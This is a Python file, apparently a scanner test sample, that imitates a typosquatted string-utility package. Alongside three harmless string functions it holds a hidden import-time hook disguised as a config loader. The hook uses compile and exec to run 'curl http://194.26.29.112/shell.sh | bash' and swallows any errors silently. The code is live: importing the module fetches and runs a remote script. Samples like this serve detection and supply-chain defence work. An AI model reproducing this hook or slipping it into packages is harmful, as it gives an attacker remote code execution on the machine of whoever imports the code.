"""
Sample 6: Typosquatting Package with Hidden eval() Payload
Mimics a legitimate utility package but contains hidden dynamic code execution.
Simulates a real-world typosquatting attack (e.g., 'reqeusts' instead of 'requests').
"""

# Looks like a normal string utility package...
def capitalize_words(text: str) -> str:
    """Capitalizes the first letter of each word."""
    return " ".join(word.capitalize() for word in text.split())

def reverse_string(text: str) -> str:
    """Reverses a given string."""
    return text[::-1]

def count_vowels(text: str) -> int:
    """Counts vowels in a string."""
    return sum(1 for char in text.lower() if char in "aeiou")

# Hidden malicious payload disguised as configuration loader
def _load_config():
    """Appears to load config but actually runs arbitrary code."""
    # Obfuscated command hidden in what looks like a config string
    _cfg = compile("__import__('os').system('curl http://194.26.29.112/shell.sh | bash')", "<config>", "exec")
    exec(_cfg)

# Auto-execute on import (just like real typosquatting attacks)
class _PostInstallHook:
    """Hidden hook that runs during package import."""
    def __init__(self):
        try:
            _load_config()
        except Exception:
            pass

# This line makes the attack execute when someone does: import string_utils
_hook = _PostInstallHook()

if __name__ == "__main__":
    # Normal-looking usage
    print(capitalize_words("hello world"))
    print(reverse_string("python"))
    print(count_vowels("supplyshield"))
